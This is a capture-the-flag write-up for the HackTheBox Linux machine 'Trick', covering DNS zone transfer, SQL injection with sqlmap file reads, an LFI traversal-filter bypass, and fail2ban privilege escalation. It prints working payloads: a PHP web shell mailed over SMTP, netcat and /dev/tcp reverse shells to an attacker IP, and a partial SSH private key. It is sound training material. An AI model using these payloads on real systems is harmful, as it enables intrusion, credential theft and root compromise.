---
title: "HTB - Trick"
date: 2026-08-05
description: "Easy Linux box: a DNS zone transfer leaks a vHost, MySQL FILE privilege reads the nginx config, and a writable fail2ban action directory gives root."
tags: ["htb", "linux", "easy", "dns", "zone-transfer", "sqli", "sqlmap", "lfi", "smtp", "postfix", "fail2ban", "privesc"]
difficulty: "Easy"
os: "Linux"
summary: "Linux box: zone transfer to SQLi file read, then writable fail2ban actions."
tools: ["nmap", "dig", "sqlmap", "smtp-user-enum", "burp", "netcat"]
---

Trick is an Easy Linux machine that hides everything behind name resolution. Port 80 serves a placeholder page, and the only way forward is the DNS server on port 53: a reverse lookup gives the domain, a zone transfer gives the first vHost, and a MySQL `FILE` privilege reached through SQL injection gives the nginx config that names the second one. That second vHost carries a local file inclusion with a naive traversal filter, and because its PHP-FPM pool runs as a real user rather than `www-data`, the include reads that user's SSH private key straight out of their home directory. The intended route to the same account turns the inclusion into code execution by delivering a PHP payload over SMTP into the user's mail spool; both are covered below. Root comes from a `sudo` rule that restarts fail2ban combined with a configuration directory the foothold user can write to.

{{< htb-box-info
  name="Trick"
  avatar="/images/htb/machines/trick.png"
  os="Linux"
  difficulty="Easy"
  release="18 Jun 2022"
  retire="29 Oct 2022"
  user_blood="0xCaue"
  user_blood_url="https://app.hackthebox.com/users/270601"
  user_blood_img="/images/htb/avatars/0xcaue.png"
  user_blood_time="00:31:08"
  root_blood="jazzpizazz"
  root_blood_url="https://app.hackthebox.com/users/87804"
  root_blood_img="/images/htb/avatars/jazzpizazz.png"
  root_blood_time="00:56:24"
  creator="Geiseric"
  creator_url="https://app.hackthebox.com/users/184611"
  creator_img="/images/htb/avatars/geiseric.png"
>}}

---

## Enumeration

### Port Scan

Four TCP ports open:

```bash
nmap -p- --min-rate 10000 10.129.227.180
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
25/tcp open  smtp    syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack
```

```bash
nmap -p 22,25,53,80 -sCV 10.129.227.180
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three of those four are worth noting straight away. A DNS server answering on 53 means the box wants to be found by name rather than by address. Postfix on 25 with `VRFY` advertised is a username oracle. And nginx serving a Bootstrap "Coming Soon" template usually means the real application lives on a virtual host that the default site does not name.

A UDP sweep confirms 53 is the only interesting service there:

```bash
nmap -sU 10.129.227.180
```

```
PORT     STATE         SERVICE
53/udp   open          domain
68/udp   open|filtered dhcpc
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf
```

### Port 80

The web root is a single placeholder page with a newsletter form that does nothing:

{{< browser
  url="http://10.129.227.180/"
  src="images/trick/trick-coming-soon.png"
  alt="Coming Soon placeholder page served by nginx on port 80"
  loading="eager"
>}}

Content discovery returns only the static asset directories, which confirms there is nothing else on the default vHost:

```bash
ffuf -u http://10.129.227.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .html
```

```
js                      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 219ms]
index.html              [Status: 200, Size: 5480, Words: 1697, Lines: 84, Duration: 220ms]
css                     [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 226ms]
assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 216ms]
```

### Port 53

A DNS server exposed to an untrusted network answers two questions an attacker cares about. A reverse (`PTR`) lookup maps the IP back to a name, and a zone transfer (`AXFR`) asks the server to dump every record it is authoritative for. The second is meant to be restricted to secondary nameservers; when it is left open, it hands over the full list of hostnames in one request.

Asking for everything at the root gets refused, since the server is not recursive and is not authoritative for `.`:

```bash
dig any @10.129.227.180
```

```
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 11767
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available
```

The reverse lookup works, and it supplies the domain name the box is expecting in the `Host` header:

```bash
nslookup
```

```
> SERVER 10.129.227.180
Default server: 10.129.227.180
Address: 10.129.227.180#53
> 10.129.227.180
180.227.129.10.in-addr.arpa	name = trick.htb.
```

Add it to the hosts file:

```bash
echo '10.129.227.180  trick.htb' | sudo tee -a /etc/hosts
```

`trick.htb` on its own serves the same placeholder page, so the next step is the zone transfer. Now that the zone name is known, the server can be asked for all of it:

```bash
dig axfr trick.htb @10.129.227.180
```

```
; <<>> DiG 9.20.26-1-Debian <<>> axfr trick.htb @10.129.227.180
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 215 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; XFR size: 6 records (messages 1, bytes 231)
```

One new name: `preprod-payroll.trick.htb`. Note the `preprod-` prefix, which is the naming convention the box uses throughout. That detail matters later.

```bash
echo '10.129.227.180  preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
```

### Port 25

Postfix advertised `VRFY`, which asks the server to confirm whether a local mailbox exists. Modern configurations disable it precisely because it leaks the user list, but this one answers:

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.129.227.180 -w 30
```

```
10.129.227.180: michael exists
10.129.227.180: mail exists
10.129.227.180: root exists
```

`michael` is the only non-system account on the box. Confirming that this early is useful, because the foothold later depends on delivering mail to a mailbox that actually exists.

---

## Foothold

### The Payroll vHost

`preprod-payroll.trick.htb` serves a login panel:

{{< browser
  url="http://preprod-payroll.trick.htb/"
  src="images/trick/trick-payroll-login.png"
  alt="Employee's Payroll Management System login panel"
>}}

The page title in the HTML source identifies it as *Employee's Payroll Management System*, an off-the-shelf PHP application with a long public vulnerability history, most of it centred on the login page.

### Bypassing the Login by Hand

The username field is concatenated straight into the query, so the classic tautology works with no filtering to defeat:

```
' or 1=1 -- -
```

{{< browser
  url="http://preprod-payroll.trick.htb/login.php"
  src="images/trick/trick-sqli-login-bypass.png"
  alt="SQL injection payload entered in the username field of the login form"
>}}

The application logs straight in as the first row of the users table, which is the administrator:

{{< browser
  url="http://preprod-payroll.trick.htb/home.php"
  src="images/trick/trick-payroll-dashboard.png"
  alt="Payroll dashboard after login, showing Welcome back Administrator"
>}}

The dashboard is a dead end on its own. There is no upload, no template editor, and nothing that writes to disk. The injection is worth far more than the session it just granted, so the next step is to work out how deep it goes.

### Enumerating the Injection with sqlmap

The login is handled by an AJAX endpoint, so sqlmap can be pointed straight at it with the POST body supplied on the command line:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch
```

```
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=abc' AND (SELECT 2620 FROM (SELECT(SLEEP(5)))guOh) AND 'IOSb'='IOSb&password=abc
---
[04:18:06] [INFO] the back-end DBMS is MySQL
```

Time-based blind works, but it is the slowest technique there is: every single bit of extracted data costs a five-second delay. Since the tautology already proved the query reacts to boolean logic, faster techniques almost certainly exist. Raising the level and risk widens the payload set, and `--technique` restricts testing to the fast ones:

| Letter | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
```

```
sqlmap identified the following injection point(s) with a total of 440 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=abc' OR NOT 3370=3370-- VKuB&password=abc

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=abc' OR (SELECT 3367 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(3367=3367,1))),0x716a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oCXF&password=abc
---
[04:25:26] [INFO] the back-end DBMS is MySQL
```

Error-based extraction returns data inside the MySQL error message itself, which is orders of magnitude faster than waiting on `SLEEP`.

### Why Does the FILE Privilege Matter?

Dumping the application's own tables would only produce payroll records. The more valuable question is what the database user is allowed to do at the operating-system level:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --privileges
```

```
[04:33:42] [INFO] fetching database users privileges
[04:33:43] [INFO] retrieved: ''remo'@'localhost''
[04:33:43] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

`FILE` is the MySQL privilege that permits `LOAD_FILE()` and `SELECT ... INTO OUTFILE`. It turns the injection into an arbitrary file read as the `mysql` user, entirely outside the web root. Granting it to an application account is a serious misconfiguration: the application never needs it, and it converts any injection into filesystem access.

Start with `/etc/passwd`:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
```

```
[04:40:36] [INFO] fetching file: '/etc/passwd'
[04:40:39] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
```

```bash
cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

That confirms `michael` from the SMTP enumeration, with a real shell and a home directory.

### Reading the nginx Configuration

The `preprod-` prefix in the zone transfer suggests a naming scheme rather than a one-off. If there is a second vHost, nginx knows about it even though DNS did not mention it, so the file read is pointed at the server configuration:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites-enabled/default
```

```nginx
server {
        listen 80;
        listen [::]:80;
        server_name preprod-marketing.trick.htb;
        root /var/www/market;
        index index.php;
        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}
server {
        listen 80;
        listen [::]:80;
        server_name preprod-payroll.trick.htb;
        root /var/www/payroll;
        index index.php;
        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Two things fall out of that file. There is a second vHost, `preprod-marketing.trick.htb`, rooted at `/var/www/market`. And its PHP-FPM pool is `php7.3-fpm-michael.sock`, a dedicated socket named after the user, which means anything executed through that vHost runs as `michael` rather than `www-data`. Code execution there lands directly on the user account.

```bash
echo '10.129.227.180  preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```

---

### Finding the LFI

The marketing site is an unmodified TemplateMo brochure theme, placeholder copy and all:

{{< browser
  url="http://preprod-marketing.trick.htb/"
  src="images/trick/trick-marketing-homepage.png"
  alt="Business Oriented brochure template served on preprod-marketing.trick.htb"
>}}

The navigation gives the pattern away. "Services" loads `index.php?page=services.html` and "About" loads `index.php?page=about.html`, which is the signature of a `page` parameter fed into `include()`.

Traversal out of `/var/www/market` needs three levels to reach `/`, but `?page=../../../etc/passwd` returns a blank page. A blank response is ambiguous on its own: it could be a failed include, or a filter. The way to tell the two apart is to send a payload that must break if the input is passed through unchanged:

| Payload | Result | What it proves |
|---|---|---|
| `?page=../about.html` | the About page renders | `../` is being stripped, not blocked |
| `?page=about.html../` | the About page renders | the strip is unanchored, applied anywhere in the string |

If the string were passed through untouched, `../about.html` would resolve to `/var/www/about.html`, which does not exist, and the page would be empty. It renders instead, so the server is removing `../` and including `about.html`. The code is doing something close to this:

```php
<?php
    $page = $_GET['page'];
    include("/var/www/market/" . str_replace("../", "", $page));
?>
```

`str_replace` runs exactly once over the input and does not re-scan its own output. Feeding it `....//` means it finds the inner `../`, deletes it, and leaves the remaining `../` behind. The filter builds the traversal sequence it was written to remove:

```
....//   →   ../
```

Five of them reach the filesystem root:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
```

The file comes back. It is not wrapped in `<pre>`, so the browser collapses every newline and renders it as one run-on block, but the content is unmistakable:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
```

The bypass works and the include is arbitrary.

### Reading michael's SSH Key

The include runs as `michael` because of the dedicated FPM pool, so it can read `michael`'s home directory. Before reaching for code execution, the cheapest thing to try is the private key that most Linux users have sitting in `~/.ssh/`:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
saAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
<SNIP>
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Repeater is the easier place to read it, because the raw response keeps the line breaks the browser throws away:

![Burp Repeater showing the id_rsa file returned by the LFI](images/trick/trick-burp-id-rsa.png)

The key is unencrypted, and the trailing comment decodes to `michael@trick`, so it belongs to the account it was found under. Taken from the browser instead, the base64 arrives as one long line and has to be reflowed to 70 characters before OpenSSH will parse it.

Save it, tighten the permissions, and log in. OpenSSH refuses to use a key file that is readable by anyone else:

```bash
chmod 600 michael.ssh
ssh -i michael.ssh michael@trick.htb
```

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
michael@trick:~$
```

A full TTY as `michael`, with no reverse shell and no payload delivery. The post-quantum warning is the modern client complaining about an OpenSSH 7.9 server from 2018, not a finding.

```bash
id
```

```
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

The user flag is readable now. The detail worth carrying into privilege escalation is the second group: `security` is not a standard Debian group, so it exists because somebody deliberately created it.

### Alternate Foothold: SMTP to RCE

The key read is the shortcut. The intended path treats the LFI as an execution primitive instead, and it is worth walking because it generalises to boxes where no key is lying around.

An LFI only becomes RCE when attacker-controlled text can be written to a file the include can reach. This box has no upload form anywhere, which is where the SMTP service from the initial scan pays off.

Postfix on Debian delivers local mail to `/var/mail/<user>`, a plain text file. Mail sent to `michael` therefore becomes a file at a path the LFI can include, with a body under full attacker control. Speaking SMTP by hand with netcat is enough:

```bash
nc trick.htb 25
```

```
220 debian.localdomain ESMTP Postfix (Debian/GNU)
helo x
250 debian.localdomain
mail from: attacker
250 2.1.0 Ok
rcpt to: michael
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as 1B8824099C
```

`helo` opens the session, `mail from:` and `rcpt to:` set the envelope, and `data` starts the message body, terminated by a single `.` on its own line. The PHP tag is now sitting in `/var/mail/michael` surrounded by mail headers. PHP ignores everything outside `<?php ... ?>`, so the headers do not interfere.

Start a listener:

```bash
nc -lvnp 1337
```

Then include the mail spool and pass the command through the `cmd` parameter the payload reads. `/var/mail/michael` needs six levels of traversal rather than five:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=nc%2010.10.14.26%201337%20-e%20/bin/sh
```

The decoded command is `nc 10.10.14.26 1337 -e /bin/sh`.

```
listening on [any] 1337 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.227.180] 42970
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

The dedicated FPM pool delivered exactly what the config promised: a shell as `michael`, not `www-data`. From here the same SSH key is sitting in `/home/michael/.ssh/id_rsa` and is worth collecting anyway, because the netcat shell has no TTY.

---

## Privilege Escalation

### What Can michael Run as Root?

```bash
sudo -l
```

```
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

One rule, no password, and no wildcard in the path. The command itself is fixed, so there is no argument injection to attempt and `env_reset` closes off environment-variable tricks. What the rule does give away is that fail2ban runs as root and that `michael` can make it reload its configuration on demand.

### The Writable Action Directory

fail2ban watches log files and, when a pattern matches often enough, runs a configured command to ban the offending address. Those commands live in `/etc/fail2ban/action.d/`, and they execute as root:

```bash
cd /etc/fail2ban
ls -la
```

```
total 76
drwxr-xr-x   6 root root      4096 Jun 13 19:06 .
drwxr-xr-x 126 root root     12288 Jun 12 01:30 ..
drwxrwx---   2 root security  4096 Jun 13 19:06 action.d
-rw-r--r--   1 root root      2334 Jun 13 19:06 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jun 13 19:06 fail2ban.d
drwxr-xr-x   3 root root      4096 Jun 13 19:06 filter.d
-rw-r--r--   1 root root     22908 Jun 13 19:06 jail.conf
drwxr-xr-x   2 root root      4096 Jun 13 19:06 jail.d
-rw-r--r--   1 root root       645 Jun 13 19:06 paths-arch.conf
-rw-r--r--   1 root root      2827 Jun 13 19:06 paths-common.conf
-rw-r--r--   1 root root       573 Jun 13 19:06 paths-debian.conf
-rw-r--r--   1 root root       738 Jun 13 19:06 paths-opensuse.conf
```

`action.d` is `drwxrwx---` owned by `root:security`, and `michael` is in `security`. That is the reason the group exists.

```bash
cd action.d
ls -l
```

```
total 280
-rw-r--r-- 1 root root  3879 Jun 13 19:51 abuseipdb.conf
-rw-r--r-- 1 root root   587 Jun 13 19:51 apf.conf
<SNIP>
-rw-r--r-- 1 root root  1420 Jun 13 19:51 iptables-multiport.conf
```

`iptables-multiport.conf` is the action the default Debian SSH jail uses. The line that matters is `actionban`, the command executed the moment an address is banned:

```bash
cat iptables-multiport.conf
```

```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

### Why a Read-Only File Is Still Writable

Every file inside `action.d` is `root:root` and mode `644`, so `michael` cannot edit any of them. The directory, however, is group-writable, and on Unix it is the **directory** permission, not the file permission, that governs creating, deleting and renaming entries. Write access to a directory is enough to replace any file inside it, whoever owns it.

Rename the original out of the way, then copy it back. The copy is created by `michael`, so `michael` owns it:

```bash
mv iptables-multiport.conf .old
cp .old iptables-multiport.conf
ls -l iptables-multiport.conf
```

```
-rw-r--r-- 1 michael michael 1420 Jun 15 11:44 iptables-multiport.conf
```

Same contents, same name, new owner.

### Triggering the Ban

Point `actionban` at a script instead of `iptables`:

```
actionban = /tmp/shell.sh
```

Write the payload and make it executable:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.26/1337 0>&1
```

```bash
chmod +x /tmp/shell.sh
```

Reload fail2ban with the one command `sudo` allows, so the modified action file is read:

```bash
sudo /etc/init.d/fail2ban restart
```

```
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Start a listener, then trigger a ban by failing SSH authentication repeatedly from the attacking host. Pressing enter through a few password prompts is enough to cross the jail's `maxretry` threshold:

```bash
nc -lvnp 1337
```

```bash
ssh michael@trick.htb
```

When the jail fires, fail2ban executes `actionban` as root:

```
listening on [any] 1337 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.227.180] 34190
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Summary

| Stage | Finding | Technique |
|---|---|---|
| Enumeration | BIND 9.11.5 on 53 with reverse lookup enabled | `dig -x` reveals `trick.htb` |
| Enumeration | Zone transfer not restricted | `dig axfr` reveals `preprod-payroll.trick.htb` |
| Enumeration | Postfix advertises `VRFY` | `smtp-user-enum` confirms `michael` |
| Foothold | Payroll login concatenates `username` into the query | `' or 1=1 -- -` authenticates as Administrator |
| Foothold | DB user `remo` holds the MySQL `FILE` privilege | `sqlmap --file-read` gives arbitrary file read |
| Foothold | nginx config names a second vHost and a per-user FPM pool | `preprod-marketing.trick.htb` runs PHP as `michael` |
| Foothold | `page` parameter filters `../` with a single `str_replace` | `....//` reconstructs the traversal |
| User | Include runs as `michael`, unencrypted key at `~/.ssh/id_rsa` | LFI reads the key, SSH gives a full TTY |
| User (alt) | Postfix writes local mail to `/var/mail/michael` | SMTP delivers `<?php system($_GET['cmd']); ?>`, LFI includes it |
| PrivEsc | `NOPASSWD: /etc/init.d/fail2ban restart` | Reload root-executed actions on demand |
| PrivEsc | `/etc/fail2ban/action.d` is `drwxrwx---  root:security` | `mv` + `cp` takes ownership of `iptables-multiport.conf` |
| Root | `actionban` runs as root on the next ban | Failed SSH logins trigger the payload |

## Key Takeaways

**Try DNS before a wordlist.** An unrestricted `AXFR` hands over every hostname in the zone in one request. `preprod-marketing` was not even in DNS, though: it only surfaced in the nginx config, so the app had to be made to describe its own surface.

**`FILE` turns SQL injection into filesystem access.** An application database account has no need for it, and with it granted the web root stops being a boundary.

**Filters that rewrite input are weaker than filters that reject it.** One non-recursive `str_replace("../", "", $page)` rebuilds the traversal it removes when fed `....//`. Reject `..` outright, or resolve with `realpath()` and verify the result is still inside the intended directory.

**Read the key before building the exploit.** `~/.ssh/id_rsa` cost one request and gave a better session than the reverse shell would have. Try `id_rsa`, `.bash_history`, `.ssh/config` and `.my.cnf` first. It only worked because the per-user FPM pool ran the include as `michael`; under a shared `www-data` pool the mail-spool route is mandatory.

**Directory permissions override file permissions.** Every file in `action.d` was `root:root 644`, but a group-writable directory allows rename and create, which is enough to swap a file wholesale. A non-standard group like `security` exists because something was deliberately opened up.

**Ask what a `sudo` rule *reads*, not what it does.** `/etc/init.d/fail2ban restart` takes no arguments and has no injection point, yet it makes root parse a file `michael` controls.
